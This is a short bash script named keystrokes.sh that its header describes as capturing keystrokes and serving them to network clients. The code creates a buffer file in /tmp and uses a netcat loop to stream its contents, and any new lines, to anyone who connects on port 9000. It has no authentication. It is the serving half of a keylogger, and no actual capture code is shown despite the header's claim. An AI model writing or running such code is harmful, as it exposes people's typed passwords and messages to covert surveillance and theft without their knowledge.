#!/usr/bin/env bash

# keystrokes.sh — captures keystrokes, buffers them, and serves buffered keystrokes to clients on TCP port

HOST=0.0.0.0
PORT=9000

BUFFER_FILE="/tmp/keystrokes_buffer.csv"

# Printing the opened port
echo "Waiting for connection on ${PORT}..."

# Create the BUFFER_FILE if it does not exist
touch "$BUFFER_FILE"

# Serve clients: for each connection, send buffer and then stream new keystrokes
while true; do
  echo "Debug: Waiting for connection..." # Debug statement
  # Use netcat to listen for connections and handle them with a continuous loop
  nc -l -k -p "$PORT" < <(
    # Send the current buffer
    cat "$BUFFER_FILE"
    # Continuously send new keystrokes as they are captured
    tail -n0 -f "$BUFFER_FILE"
  )
done
